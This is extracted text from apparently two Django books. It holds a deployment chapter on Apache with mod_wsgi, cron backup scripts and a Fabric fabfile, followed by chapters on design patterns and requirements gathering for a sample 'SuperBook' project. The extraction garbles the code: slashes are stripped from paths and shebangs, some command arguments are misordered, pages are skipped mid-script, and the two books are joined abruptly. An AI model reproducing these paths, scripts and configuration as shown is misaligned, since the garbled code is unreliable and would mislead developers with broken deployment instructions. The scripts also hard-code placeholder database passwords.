myproject@server$ ssh-add ~ .ssh id_rsa   myproject myproject@server$ cat ~ .ssh id_rsa.pub  2.  This last command prints your SSH public key that you need to copy and   paste at Manage Account  SSH keys  Add Key on the Bitbucket website.  482  Testing and Deployment   8.  Create a project directory, go to it, and clone your project's code as follows:   myproject myproject@server$ git clone \  git@bitbucket.org:somebitbucketuser myproject.git myproject  Now, your project path should be something similar to the following:   home myproject project myproject  9.   Install the Python requirements for your project, including a specified version of  Django, as follows:  myproject myproject@server$ pip install -r requirements.txt  10.  Create the media, tmp, and static directories under your project's directory. 11.  Also, create local_settings.py with settings similar to the following:    home myproject project myproject myproject local_settings.py DATABASES = {     "default": {         "ENGINE": "django.db.backends.mysql",         "NAME": "myproject",         "USER": "myproject",         "PASSWORD": "mypassword",     } } PREPEND_WWW = True DEBUG = False ALLOWED_HOSTS = ["myproject.com"]  12. Import the database dump that you created locally. If you are using a Mac, you can  do that with an app, Sequel Pro  http:  www.sequelpro.com  , using an SSH  connection. You can also upload the database dump to the server by FTP and then  run the following in Secure Shell:  myproject myproject@server$ python manage.py dbshell < \  ~ db_backups db.sql  13.  Collect static files, as follows:  --noinput   myproject myproject@server$ python manage.py collectstatic \  14.  Go to the ~ public_html directory and create a wsgi file using the nano editor  or   an editor of your choice :   home myproject public_html my.wsgi ! home myproject bin python  -*- coding: utf-8 -*-  483  Chapter 11   import os, sys, site django_path = os.path.abspath      os.path.join os.path.dirname __file__ ,     ".. lib python2.6 site-packages " ,   site.addsitedir django_path  project_path = os.path.abspath      os.path.join os.path.dirname __file__ ,     ".. project myproject" ,   sys.path += [project_path] os.environ["DJANGO_SETTINGS_MODULE"] = "myproject.settings" from django.core.wsgi import get_wsgi_application application = get_wsgi_application    15.  Then, create the .htaccess file in the same directory. The .htaccess file will  redirect all the requests to your Django project set in the wsgi file, as shown in   the following:   home myproject public_html .htaccess AddHandler wsgi-script .wsgi DirectoryIndex index.html RewriteEngine On RewriteBase   RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} index.html !-f RewriteCond %{REQUEST_URI} !^ media  RewriteCond %{REQUEST_URI} !^ static  RewriteRule ^ .* $  my.wsgi $1 [QSA,L]  16.  Copy .htaccess as .htaccess_live. 17.  Then, also create .htaccess_maintenace for maintenance cases. This new   Apache configuration file will show temporarily-offline.html for all the users  except you, recognized by the IP address of your LAN or computer. You can check your  IP by googling what's my ip. The following is how the .htaccess_maintenance  will look:   home myproject public_html .htaccess_maintenance AddHandler wsgi-script .wsgi DirectoryIndex index.html RewriteEngine On RewriteBase   RewriteCond %{REMOTE_HOST} !^1\.2\.3\.4$ RewriteCond %{REQUEST_URI} ! temporarily-offline\.html RewriteCond %{REQUEST_URI} !^ media  RewriteCond %{REQUEST_URI} !^ static   484  Testing and Deployment   RewriteRule .*  temporarily-offline.html [R=302,L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} index.html !-f RewriteCond %{REQUEST_URI} !^ media  RewriteCond %{REQUEST_URI} !^ static  RewriteRule ^ .* $  my.wsgi $1 [QSA,L]  Replace the IP digits in this file with your own IP.  18.  Then, create an HTML file that will be shown when your website is down:    The site is being updated... Please come back later.  19.  Log in to the server as the root user via Secure Shell and edit the Apache configuration:  1.  Open the domain configuration file, as follows:  $ nano  etc apache2 sites-available myproject.mydomain.conf  2.  Add the following lines before  :  Options -Indexes AliasMatch ^ static \d+  .*  \     " home myproject project myproject static $1" AliasMatch ^ media  .*  \     " home myproject project myproject media $1"       ExpiresActive On     ExpiresDefault "access plus 1 year"    3.  Restart Apache for the changes to take effect:  $  etc init.d apache2 restart  20. Set the default scheduled cron jobs. For more information on how to do this, refer to   the Setting up cron jobs for regular tasks recipe.  How it works... With this configuration, files in the media and static directories are served directly from  Apache; whereas, all the other URLs are handled by the Django project through the my.wsgi  file.  485  Chapter 11   Using the   directive in the Apache site configuration, all media files are set to  be cached for one year. Static URL paths have a numbered prefix that changes whenever you  update the code from the Git repository.  When you need to update the website and want to set it down for maintenance, you'll have to  copy .htaccess_maintenance to .htaccess. When you want to set the website up again,  you'll have to copy .htaccess_live to .htaccess.  There's more...

This can be achieved using cron jobs that are also known as scheduled tasks.  These are scripts that run on the server for the specified period of time. In this recipe, we will  create two cron jobs: one to clear sessions from the database and another to back up the  database data. Both will be run every night.  Getting ready To start with, deploy your Django project on to a remote server. Then, connect to the server   by SSH.  486  Testing and Deployment   How to do it... Let's create the two scripts and make them run regularly by following these steps:  1.  Create the commands, db_backups and logs directories in your project's    home directory:  myproject myproject@server$ mkdir commands   myproject myproject@server$ mkdir db_backups   myproject myproject@server$ mkdir logs  2.   In the commands directory, create a cleanup.sh file with the following content:   home myproject commands cleanup.sh !  usr bin env bash PROJECT_PATH= home myproject CRON_LOG_FILE=${PROJECT_PATH} logs cleanup.log  echo "Cleaning up the database" > ${CRON_LOG_FILE} date >> ${CRON_LOG_FILE}  cd ${PROJECT_PATH} . bin activate cd project myproject python manage.py cleanup --traceback >> \ ${CRON_LOG_FILE}  2>&1  3.  Make the following file executable:   myproject myproject@server$ chmod +x cleanup.sh  4.  Then, in the same directory, create a backup_db.sh file with the following content:    home myproject commands cleanup.sh !  usr bin env bash PROJECT_PATH= home myproject CRON_LOG_FILE=${PROJECT_PATH} logs backup_db.log WEEK_DATE=$ LC_ALL=en_US.UTF-8 date +"%w-%A"  BACKUP_PATH=${PROJECT_PATH} db_backups ${WEEK_DATE}.sql DATABASE=myproject USER=my_db_user PASS=my_db_password  EXCLUDED_TABLES=  django_session    IGNORED_TABLES_STRING=''  487  Chapter 11   for TABLE in "${EXCLUDED_TABLES[@]}" do :     IGNORED_TABLES_STRING+=\     " --ignore-table=${DATABASE}.${TABLE}" done  echo "Creating DB Backup" > ${CRON_LOG_FILE} date >> ${CRON_LOG_FILE}  cd ${PROJECT_PATH} mkdir -p db_backups  echo "Dump structure" >> ${CRON_LOG_FILE} mysqldump -u ${USER} -p${PASS} --single-transaction \ --no-data ${DATABASE} > ${BACKUP_PATH} 2>> ${CRON_LOG_FILE}  echo "Dump content" >> ${CRON_LOG_FILE} mysqldump -u ${USER} -p${PASS} ${DATABASE} \ ${IGNORED_TABLES_STRING} >> ${BACKUP_PATH} 2>> \ ${CRON_LOG_FILE}  5.  Make the following file executable too:   myproject myproject@server$ chmod +x backup_db.sh  6.  Test the scripts to see whether they are executed correctly by running the scripts and   then checking the *.log files in the logs directory, as follows:  myproject myproject@server$ . cleanup.sh   myproject myproject@server$ . backup_db.sh  7.   In your project's home directory create a crontab.txt file with the following tasks: 00 01 * * *  home myproject commands cleanup.sh  00 02 * * *  home myproject commands backup_db.sh  8.   Install the crontab tasks, as follows:  myproject myproject@server$ crontab -e crontab.txt  How it works... With the current setup, every night cleanup.sh will be executed at 1 A.M. and backup_ db.sh will be executed at 2 A.M. The execution logs will be saved in cleanup.log and  backup_db.log. If you get any errors, you should check these files for the traceback.  488  Testing and Deployment   The database backup script is a little more complex. Every day of the week, it creates a  backup file for that day called 0-Sunday.sql, 1-Monday.sql, and so on. Therefore,   you will be able to restore data backed seven days ago or later. At first, the backup script  dumps the database schema for all the tables and then it dumps the data for all the tables,  except for the ones listed one under each other in EXCLUDED_TABLES  currently, that is,  django_session .  The crontab syntax is this: each line contains a specific period of time and then a task to run  at it. The time is defined in five parts separated by spaces, as shown in the following:   f Minutes from 0 to 59  f Hours from 0 to 23  f Days of month from 1 to 31  f Months from 1 to 12  f Days of week from 0 to 7, where 0 is Sunday, 1 is Monday, and so on. 7 is    Sunday again.  An asterisk  *  means that every time frame will be used. Therefore, the following task defines  cleanup.sh to be executed at 1:00 AM every day of a month, every month, and every day of  the week:  00 01 * * *  home myproject commands cleanup.sh  You can learn more about the specifics of the crontab at https:  en.wikipedia.org  wiki Cron.  See also   f The Deploying on Apache with mod_wsgi recipe  f The Creating and using the Fabric deployment script recipe  Creating and using the Fabric deployment  script Usually, to update your site, you have to perform repetitive tasks such as setting a  maintenance page, stopping cron jobs, creating a database backup, pulling new code from a  repository, migrating databases, collecting static files, testing, starting cron jobs again, and  unsetting the maintenance page. That's quite a tedious work, where mistakes can occur. Also,  you need not forget the different routines for staging site  the one where new features can  be tested  and production site  which is shown to the public . Fortunately, there is a Python  library called Fabric that allows you to automate these tasks. In this recipe, you will learn how  to create fabfile.py, the script for Fabric, and how to deploy your project on staging and  production environments.  489  Chapter 11   The Fabric script can be called from the directory that contains it, as follows:   myproject_env $ fab staging deploy  This will deploy the project on the staging server.  Getting ready Set up analogous staging and production websites using the instructions in the Deploying  on Apache with mod_wsgi recipe. Install Fabric on your computer globally or in your project's  virtual environment, as follows:  $ pip install fabric  How to do it... We will start by creating a fabfile.py file in the Django project directory with several  functions, as follows:   fabfile.py  -*- coding: UTF-8 -*- from fabric.api import env, run, prompt, local, get, sudo from fabric.colors import red, green from fabric.state import output  env.environment = "" env.full = False output['running'] = False  PRODUCTION_HOST = "myproject.com" PRODUCTION_USER = "myproject"  def dev  :     """ chooses development environment """     env.environment = "dev"     env.hosts = [PRODUCTION_HOST]     env.user = PRODUCTION_USER     print "LOCAL DEVELOPMENT ENVIRONMENT\n"   def staging  :     """ chooses testing environment """     env.environment = "staging"     env.hosts = ["staging.myproject.com"]     env.user = "myproject"  490  Testing and Deployment       print "STAGING WEBSITE\n"   def production  :     """ chooses production environment """     env.environment = "production"     env.hosts = [PRODUCTION_HOST]     env.user = PRODUCTION_USER     print "PRODUCTION WEBSITE\n"   def full  :     """ all commands should be executed without questioning """     env.full = True  def deploy  :     """ updates the chosen environment """     if not env.environment:         while env.environment not in  "dev", "staging",             "production" :             env.environment = prompt red 'Please specify target'                 'environment  "dev", "staging", or '                 '"production" : '               print     globals  ["_update_%s" % env.environment]    The dev  , staging  , and production   functions set the appropriate environment  for the current task. Then, the deploy   function calls the _update_dev  , _update_ staging  , or _update_production   private functions, respectively.

Each non-private function in a fabfile.py file becomes a possible argument to be called  from the command-line tool. To see all the available functions, run the following command:   myproject_env $ fab --list  Available commands:      deploy      updates the chosen environment      dev         chooses development environment      full        all commands should be executed without questioning      production  chooses production environment      staging     chooses testing environment  These functions are called in the same order as they are passed to the Fabric script,   therefore you need to be careful about the order of the arguments when deploying to   different environments:   f To deploy in a development environment, you would run the following command:   myproject_env $ fab dev deploy  This will ask you questions similar to the following: Get latest production database  y n ? [y] _  When answered positively, a specific step will be executed.   f To deploy in a staging environment, you would run the following command:   myproject_env $ fab staging deploy   f Finally, to deploy in a production environment, you would run the following command:   myproject_env $ fab production deploy  For each step of deployment, you will be asked whether you want to do it or skip it. If you want  to execute all the steps without any prompts  except the password requests , add a full  parameter to the deployment script, as follows:   myproject_env $ fab dev full deploy  The Fabric script utilizes several basic functions that can be described as follows:   f local  : This function is used to run a command locally in the current computer  f run  : This function is used to run a command as a specified user on a remote   server  498  Testing and Deployment    f prompt  : This function is used to ask a question  f get  : This function is used to download a file from a remote server to a local computer  f sudo  : This function is used to run a command as the root  or other  user  Fabric uses the Secure Shell connection to perform tasks on remote servers. Each run   or  sudo   command is executed as a separate connection; therefore, when you want to execute  multiple commands at once, you have to either create a bash script on the server and call  it from Fabric or you have to separate the commands using the && shell operator, which  executes the next command only if the previous one was successful.  We are also using the scp command to copy files from the production server to the staging  server. The syntax of scp for recursively copying all the files from a specified directory is  similar to the following:  scp -r myproject_user@myproject.com: path on production server * \   path on staging server   To make the output more user-friendly, we are using colors, as follows:  print green " * migrating database schema..."    The deployment script expects you to have two management commands: prepare_dev and  prepare_staging. It's up to you to decide what to put in these commands. Basically, you  could change the super user password to a simpler one and change the site domain there. If  you don't need such functionality, just remove that from the Fabric script.  The general rule of thumb is not to store any sensitive data in the Fabric script if it is saved  in the Git repository. Therefore, for example, to make a backup of the database, we call the  backup_db.sh script on the remote production server. The content of such a file could be  something similar to the following:   ~ db_backups backup_db.sh ! bin bash if [[ $1 = '--latest' ]] then     today="latest" else     today=$ date +%Y-%m-%d-%H%M  fi mysqldump --opt -u my_db_user -pmy_db_password myproject > \     db_$today.sql  You can make it executable with the following:  $ chmod +x backup_db.sh  499  Chapter 11   When the preceding command is run without parameters, it will create a database dump with  the date and time in the filename, for example, db_2014-04-24-1400.sql, as follows:  $ . backup_db.sh  $ . backup_db.sh --latest  When the --latest parameter is passed, the filename of the dump will be db_latest.sql:  There's more... Fabric scripts can be used not only for deployment, but also for any routine that you need  to perform on remote servers, for example, collecting translatable strings when you are  using the Rosetta tool to translate *.po files online, rebuild search indexes when you are  using Haystack for full-text searches, create backups on demand, call custom management  commands, and so on.

Well-known pattern collections    Patterns in Django  According to Bowei Gai's "World Startup Report," there were more than 136,000  Internet firms across the world in 2013, with more than 60,000 in America alone.   Of these, 87 US companies are valued more than 1 billion dollars. Another study   says that of 12,000 people aged between 18 and 30 in 27 countries, more than   two-thirds see opportunities in becoming an entrepreneur.  This entrepreneurial boom in digital startups is primarily due to the tools and  technologies of startups becoming cheap and ubiquitous. Creating a fully fledged  web application takes a lot less time than it used to, thanks to powerful frameworks.  With a gentle learning curve, even first-time programmers can learn to create web  applications easily. However, soon they would keep solving the same problems  others have been facing again and again. This is where understanding patterns   can really help save their time.  [ 503 ]   [ 504 ]  Django and Patterns   [ 505 ]  Chapter 1       [ 506 ]  Django and Patterns   How does Django work to? To truly appreciate Django, you will need to peek under the hood and see the  various moving parts inside. This can be both enlightening and overwhelming.   If you are already familiar with this, you might want to skip this section.  How web requests are processed in a typical Django application  The preceding figure shows the simplified journey of a web request from a visitor's  browser to your Django application and back. The numbered paths are as follows:  1.  The browser sends the request  essentially, a string of bytes  to your    web server.  2.  Your web server  say, Nginx  hands over the request to a WSGI server    say, uWSGI  or directly serves a file  say, a CSS file  from the filesystem.  3.  Unlike a web server, WSGI servers can run Python applications. The request  populates a Python dictionary called environ and, optionally, passes through  several layers of middleware, ultimately reaching your Django application. 4.  URLconf contained in the  urls.py of your application selects a view to  handle the request based on the requested URL. The request has turned   into HttpRequest—a Python object.  [ 507 ]  Chapter 1   5.  The selected view typically does one or more of the following things:  5a. Talks to a database via the models 5b. Renders HTML or any other formatted response using templates 5c. Returns a plain text response  not shown  5d. Raises an exception  6.  The HttpResponse object gets rendered into a string, as it leaves    the Django application.  7.  A beautifully rendered web page is seen in your user's browser.  Though certain details are omitted, this representation should help you   appreciate Django's high-level architecture. It also show the roles played by   the key components, such as models, views, and templates. Many of Django's  components are based on several well-known design patterns.  What is a Pattern? What is common between the words "Blueprint," "Scaffolding," and "Maintenance"?  These software development terms have been borrowed from the world of building  construction and architecture. However, one of the most influential terms comes  from a treatise on architecture and urban planning written in 1977 by the leading  Austrian architect Christopher Alexander and his team consisting of Murray  Silverstein, Sara Ishikawa, and several others. The term "Pattern" came in vogue after their seminal work, A Pattern Language:  Towns, Buildings, Construction  volume 2 in a five-book series  based on the  astonishing insight that users know about their buildings more than any architect  ever could. A pattern refers to an everyday problem and its proposed but   time-tested solution.  In the book, Christopher Alexander states that "Each pattern describes a problem,  which occurs over and over again in our environment, and then describes the   core of the solution to that problem in such a way that you can use this solution   a million times over, without ever doing it the same way twice."  For example, the Wings Of Light pattern describes how people prefer buildings   with more natural lighting and suggests arranging the building so that it is   composed of wings. These wings should be long and narrow, never more than   25 feet wide. Next time you enjoy a stroll through the long well-lit corridors of   an old university, be grateful to this pattern.  [ 508 ]  Django and Patterns   Their book contained 253 such practical patterns, from the design of a room to the  design of entire cities. Most importantly, each of these patterns gave a name to an  abstract problem and together formed a pattern language. Remember when you first came across the word déjà vu? You probably thought  "Wow, I never knew that there was a word for that experience." Similarly, architects  were not only able to identify patterns in their environment but could also, finally,  name them in a way that their peers could understand. In the world of software, the term design pattern refers to a general repeatable  solution to a commonly occurring problem in software design. It is a formalization   of best practices that a developer can use. Like in the world of architecture, the  pattern language has proven to be extremely helpful to communicate a certain   way of solving a design problem to other programmers.  There are several collections of design patterns but some have been considerably  more influential than the others.  Gang of Four Patterns One of the earliest efforts to study and document design patterns was a book   titled Design Patterns: Elements of Reusable Object-Oriented Software by Erich Gamma,  Richard Helm, Ralph Johnson, and John Vlissides, who later became known as the  Gang of Four  GoF . This book is so influential that many consider the 23 design  patterns in the book as fundamental to software engineering itself.  In reality, the patterns were written primarily for object-oriented programming  languages, and it had code examples in C++ and Smalltalk. As we will see shortly,  many of these patterns might not be even required in other programming languages  with better higher-order abstractions such as Python.  The 23 patterns have been broadly classified by their type as follows:     Creational Patterns: These include Abstract Factory, Builder Pattern,    Factory Method, Prototype Pattern, and Singleton Pattern     Structural Patterns: These include Adapter Pattern, Bridge Pattern,   Composite Pattern, Decorator Pattern, Facade Pattern, Flyweight Pattern,  and Proxy Pattern     Behavioral Patterns: These include Chain of Responsibility, Command  Pattern, Interpreter Pattern, Iterator Pattern, Mediator Pattern, Memento  Pattern, Observer Pattern, State Pattern, Strategy Pattern, Template   Pattern, and Visitor Pattern  [ 509 ]  Chapter 1   While a detailed explanation of each pattern would be beyond the scope of this book,  it would be interesting to identify some of these patterns in Django itself:  GoF Pattern Command Pattern  Django Component HttpRequest  Observer pattern  Signals  Template Method  Class-based generic  views  Explanation This encapsulates a request in  an object When one object changes state,  all its listeners are notified and  updated automatically Steps of an algorithm can  be redefined by subclassing  without changing the  algorithm's structure  While these patterns are mostly of interest to those studying the internals of   Django, the pattern under which Django itself can be classified under—is a   common question.  Is Django MVC? Model-View-Controller  MVC  is an architectural pattern invented by Xerox   PARC in the 70s. Being the framework used to build user interfaces in Smalltalk,   it gets an early mention in the GoF book.  Today, MVC is a very popular pattern in web application frameworks. Beginners  often ask the question—is Django an MVC framework?  The answer is both yes and no. The MVC pattern advocates the decoupling of   the presentation layer from the application logic. For instance, while designing   an online game website API, you might present a game's high scores table as an  HTML, XML, or comma-separated  CSV  file. However, its underlying model class  would be designed independent of how the data would be finally presented.  MVC is very rigid about what models, views, and controllers do. However, Django  takes a much more practical view to web applications. Due to the nature of the   HTTP protocol, each request for a web page is independent of any other request.  Django's framework is designed like a pipeline to process each request and prepare   a response. Django calls this the Model-Template-View  MTV  architecture. There is separation  of concerns between the database interfacing classes  Model , request-processing  classes  View , and a templating language for the final presentation  Template .  [ 510 ]  Django and Patterns   If you compare this with the classic MVC—"Model" is comparable to Django's  Models, "View" is usually Django's Templates, and "Controller" is the framework  itself that processes an incoming HTTP request and routes it to the correct view  function.  If this has not confused you enough, Django prefers to name the callback function   to handle each URL a "view" function. This is, unfortunately, not related to the   MVC pattern's idea of a View.  Fowler's Patterns In 2002, Martin Fowler wrote Patterns of Enterprise Application Architecture,   which described 40 or so patterns he often encountered while building   enterprise applications.  Unlike the GoF book, which described design patterns, Fowler's book was about  architectural patterns. Hence, they describe patterns at a much higher level of  abstraction and are largely programming language agnostic.  Fowler's patterns are organized as follows:     Domain Logic Patterns: These include Domain Model, Transaction Script,   Service Layer , and Table Module     Data Source Architectural Patterns: These include Row Data Gateway,    Table Data Gateway, Data Mapper, and Active Record     Object-Relational Behavioral Patterns: These include Identity Map,    Unit of Work, and Lazy Load     Object-Relational Structural Patterns: These include Foreign Key Mapping,   Mapping, Dependent Mapping, Association Table Mapping, Identity  Field, Serialized LOB, Embedded Value, Inheritance Mappers, Single Table  Inheritance, Concrete Table Inheritance, and Class Table Inheritance     Object-Relational Metadata Mapping Patterns: These include Query    Object, Metadata Mapping, and Repository     Web Presentation Patterns: These include Page Controller, Front    Controller, Model View Controller, Transform View, Template View,  Application Controller, and Two-Step View     Distribution Patterns: These include Data Transfer Object and    Remote Facade     Offline Concurrency Patterns: These include Coarse Grained Lock,   Implicit Lock, Optimistic Offline Lock, and Pessimistic Offline Lock  [ 511 ]  Chapter 1      Session State Patterns: These include Database Session State, Client Session   State, and Server Session State     Base Patterns: These include Mapper, Gateway, Layer Supertype, Registry,  Value Object, Separated Interface, Money, Plugin, Special Case, Service Stub,  and Record Set  Almost all of these patterns would be useful to know while architecting a Django  application. In fact, Fowler's website at http:  martinfowler.com eaaCatalog  has  an excellent catalog of these patterns. I highly recommend that you check them out.  Django also implements a number of these patterns. The following table lists a few   of them:  Fowler Pattern Active Record  Django Component Django Models  Class Table  Inheritance  Model Inheritance  Identity Field  Id Field  Template View  Django Templates  Explanation Encapsulates the  database access, and  adds domain logic on  that data Each entity in the  hierarchy is mapped  to a separate table Saves a database ID  field in an object to  maintain identity Renders into HTML  by embedding  markers in HTML  Are there more patterns? Yes, of course. Patterns are discovered all the time. Like living beings, some   mutate and form new patterns: take, for instance, MVC variants such as   Model–view–presenter  MVP , Hierarchical model–view–controller  HMVC ,   or Model View ViewModel  MVVM . Patterns also evolve with time as better solutions to known problems are identified.  For example, Singleton pattern was once considered to be a design pattern but now  is considered to be an Anti-pattern due to the shared state it introduces, similar to  using global variables. An Anti-pattern can be defined as commonly reinvented   but a bad solution to a problem.  [ 512 ]  Django and Patterns   Some of the other well-known books which catalog patterns are Pattern-Oriented  Software Architecture  known as POSA  by Buschmann, Meunier, Rohnert,  Sommerlad, and Sta; Enterprise Integration Patterns by Hohpe and Woolf; and   The Design of Sites: Patterns, Principles, and Processes for Crafting a Customer-Centered  Web Experience by Duyne, Landay, and Hong.  Patterns in this book This book will cover Django-specific design and architecture patterns, which would  be useful to a Django developer. The upcoming sections will describe how each  pattern will be presented.  Pattern name The heading is the pattern name. If it is a well-known pattern, the commonly used  name is used; otherwise, a terse, self-descriptive name has been chosen. Names are  important, as they help in building the pattern vocabulary. All patterns will have   the following parts: Problem: This briefly mentions the problem. Solution: This summarizes the proposed solution s . Problem Details: This elaborates the context of the problem and possibly   gives an example. Solution Details: This explains the solution s  in general terms and   provides a sample Django implementation.  Criticism of Patterns Despite their near universal usage, Patterns have their share of criticism too.   The most common arguments against them are as follows:     Patterns compensate for the missing language features: Peter Norvig    found that 16 of the 23 patterns in Design Patterns were 'invisible or   simpler' in Lisp. Considering Python's introspective facilities and   first-class functions, this might as well be the case for Python too.     Patterns repeat best practices: Many patterns are essentially formalizations  of best practices such as separation of concerns and could seem redundant.    Patterns can lead to over-engineering: Implementing the pattern might be   less efficient and excessive compared to a simpler solution.  [ 513 ]  Chapter 1   How to use Patterns While some of the previous criticisms are quite valid, they are based on how   patterns are misused. Here is some advice that can help you understand how   best to use design patterns:     Don't implement a pattern if your language supports a direct solution    Don't try to retro-fit everything in terms of patterns    Use a pattern only if it is the most elegant solution in your context    Don't be afraid to create new patterns  Best practices In addition to design patterns, there might be a recommended approach to solving a  problem. In Django, as with Python, there might be several ways to solve a problem  but one idiomatic approach among those.  Python Zen and Django's design philosophy Generally, the Python community uses the term 'Pythonic' to describe a piece of  idiomatic code. It typically refers to the principles laid out in 'The Zen of Python'.  Written like a poem, it is extremely useful to describe such a vague concept.  Try entering import this in a Python prompt to view 'The Zen  of Python'.  Furthermore, Django developers have crisply documented their design philosophies  while designing the framework at https:  docs.djangoproject.com en dev  misc design-philosophies .  While the document describes the thought process behind how Django was designed,  it is also useful for developers using Django to build applications. Certain principles  such as Don't Repeat Yourself  DRY , loose coupling, and tight cohesion can help   you write more maintainable and idiomatic Django applications.  [ 514 ]  Django and Patterns   Django or Python best practices suggested by this book would be formatted in the  following manner:  Best Practice: Use BASE_DIR in settings.py and avoid hard-coding directory names.  Summary In this chapter, we looked at why people choose Django over other web frameworks,  its interesting history, and how it works. We also examined design patterns, popular  pattern collections, and best practices.  In the next chapter, we will take a look at the first few steps in the beginning of a  Django project such as gathering requirements, creating mockups, and setting up   the project.  [ 515 ]  Chapter 1    Application Design  In this chapter, we will cover the following topics:     Gathering requirements    Creating a concept document    HTML mockups    How to divide a project into Apps    Whether to write a new app or reuse an existing one    Best practices before starting a project    Why Python 3?    Starting the SuperBook project  Many novice developers approach a new project by beginning to write code right  away. More often than not it leads to incorrect assumptions, unused features and lost  time. Spending some time with your client in understanding core requirements even  in a project short on time can yield incredible results. Managing requirements is a  key skill worth learning.  How to gather requirements  Innovation is not about saying yes to everything. It's about saying NO to all but  the most crucial features.  – Steve Jobs  I saved several doomed projects by spending a few days with the client to carefully  listen to their needs and set the right expectations. Armed with nothing but a pencil  and paper  or their digital equivalents , the process is incredibly simple but effective.  Here are some of the key points to remember while gathering requirements:  1.  Talk directly to the application owners even if they are not technical savvy.  [ 517 ]   2.  Make sure you listen to their needs fully and note them. 3.  Don't use technical jargon such as "models". Keep it simple and use end-user   friendly terms such as a "user profile".  4.  Set the right expectations. If something is not technically feasible or difficult,   make sure you tell them right away.  5.  Sketch as much as possible. Humans are visual in nature. Websites more so.   Use rough lines and stick figures. No need to be perfect.  6.  Break down process flows such as user signup. Any multistep functionality   needs to be drawn as boxes connected by arrows.  7.  Finally, work through the features list in the form of user stories or in any    easy way to understand the form.  8.  Play an active role in prioritizing the features into high, medium,    or low buckets.  9.  Be very, very conservative in accepting new features. 10.  Post-meeting, share your notes with everyone to avoid misinterpretations.  The first meeting will be long  perhaps a day-long workshop or couple of hour-long  meetings . Later, when these meetings become frequent, you can trim them down   to 30 minutes or one hour.  The output of all this would be a one page write-up and a couple of poorly   drawn sketches.  In this book, we have taken upon ourselves the noble project of building a  social network called SuperBook for superheroes. A simple sketch based off our  discussions with a bunch of randomly selected superheroes is shown as follows:  A sketch of the SuperBook website in responsive design. Desktop  left  and smartphone  right  layouts are shown.  [ 518 ]  Application Design   Are you a story teller? So what is this one page write-up? It is a simple document that explains how it   feels to use the site. In almost all the projects I have worked with, when someone   new joins the team, they don't normally go through every bit of paperwork.   He or she would be thrilled if they find a single-page document that quickly   tells them what the site is meant to be.  You can call this document whatever you like—concept document, market  requirements document, customer experience documentation, or even an Epic  Fragile StoryLog™  patent pending . It really doesn't matter.  The document should focus on the user experience rather than technical or  implementation details. Make it short and interesting to read. In fact, Joel   Spolsky's rule number one on documenting requirements is "Be Funny". If possible, write about a typical user  persona in marketing speak , the problem   they are facing, and how the web application solves it. Imagine how they would  explain the experience to a friend. Try to capture this.  Here is a concept document for the SuperBook project:  The SuperBook concept The following interview was conducted after our website SuperBook  was launched in the future. A 30 minute user test was conducted just  prior to the interview. Please introduce yourself. My name is Aksel. I am a gray squirrel living in downtown New   York. However, everyone calls me Acorn. My dad, T. Berry, a famous  hip-hop star, used to call me that. I guess I was never good enough   at singing to take up the family business. Actually, in my early days, I was a bit of a kleptomaniac. I am allergic  to nuts, you know. Other bros have it easy. They can just live off any  park. I had to improvise—cafes, movie halls, amusement parks, and   so on. I read labels very carefully too. Ok, Acorn. Why do you think you were chosen for the user testing? Probably, because I was featured in a NY Star special on lesser-known  superheroes. I guess people find it amusing that a squirrel can use  a MacBook  Interviewer: this interview was conducted over chat . Plus, I  have the attention span of a squirrel.  [ 519 ]  Chapter 2   Based on what you saw, what is your opinion about SuperBook? I think it is a fantastic idea. I mean, people see superheroes all the  time. However, nobody cares about them. Most are lonely and  antisocial. SuperBook could change that. What do you think is different about Superbook? It is built from the ground up for people like us. I mean, there is no  "Work and Education" nonsense when you want to use your secret  identity. Though I don't have one, I can understand why one would. Could you tell us briefly some of the features you noticed? Sure, I think this is a pretty decent social network, where you can:     Sign up with any user name  no more, "enter your real       Fans can follow people without having to add them as   name", silliness   "friends"     Make posts, comment on them, and re-share them    Send a private post to another user  Everything is easy. It doesn't take a superhuman effort to figure it out. Thanks for your time, Acorn.  HTML mockups In the early days of building web applications, tools such as Photoshop and Flash  were used extensively to get pixel-perfect mockups. They are hardly recommended  or used anymore.  Giving a native and consistent experience across smartphones, tablets, laptops, and  other platforms is now considered more important than getting that pixel-perfect  look. In fact, most web designers directly create layouts on HTML.  Creating an HTML mockup is a lot faster and easier than before. If your web  designer is unavailable, developers can use a CSS framework such as Bootstrap   or ZURB Foundation framework to create pretty decent mockups.  The goal of creating a mockup is to create a realistic preview of the website. It   should not merely focus on details and polish to look closer to the final product  compared to a sketch, but add interactivity as well. Make your static HTML come   to life with working links and some simple JavaScript-driven interactivity.  A good mockup can give 80 percent of customer experience with less than   20 percent of the overall development effort. [ 520 ]  Application Design   Designing the application When you have a fairly good idea of what you need to build, you can start to think  about the implementation in Django. Once again, it is tempting to start coding away.  However, when you spend a few minutes thinking about the design, you can find  plenty of different ways to solve a design problem. You can also start designing tests first, as advocated in Test-driven Design  TDD   methodology. We will see more of the TDD approach in the testing chapter.  Whichever approach you take, it is best to stop and think—"Which are the different  ways in which I can implement this? What are the trade-offs? Which factors are more  important in our context? Finally, which approach is the best?"  Experienced Django developers look at the overall project in different ways.   Sticking to the DRY principle  or sometimes because they get lazy , they think  —"Have I seen this functionality before? For instance, can this social login   feature be implemented using a third-party package such as django-all-auth?"  If they have to write the app themselves, they start thinking of various design  patterns in the hope of an elegant design. However, they first need to break   down a project at the top level into apps.  Dividing a project into Apps Django applications are called projects. A project is made up of several applications  or apps. An app is a Python package that provides a set of features.  Ideally, each app must be reusable. You can create as many apps as you need. Never  be afraid to add more apps or refactor the existing ones into multiple apps. A typical  Django project contains 15-20 apps.  An important decision to make at this stage is whether to use a third-party Django  app or build one from scratch. Third-party apps are ready-to-use apps, which are   not built by you. Most packages are quick to install and set up. You can start using  them in a few minutes.  On the other hand, writing your own app often means designing and implementing  the models, views, test cases, and so on yourself. Django will make no distinction  between apps of either kind.  [ 521 ]  Chapter 2   Reuse or roll-your-own? One of Django's biggest strengths is the huge ecosystem of third-party apps. At the  time of writing, djangopackages.com lists more than 2,600 packages. You might  find that your company or personal library has even more. Once your project is  broken into apps and you know which kind of apps you need, you will need to   take a call for each app—whether to write or reuse an existing one.  It might sound easier to install and use a readily available app. However, it not as  simple as it sounds. Let's take a look at some third-party authentication apps for   our project, and list the reasons why we didn't use them for SuperBook at the time   of writing:     Over-engineered for our needs: We felt that python-social-auth    with support for any social login was unnecessary     Too specific: Using django-facebook would mean tying our    authentication to that provided by a specific website     Python dependencies: One of the requirements of django-allauth    is 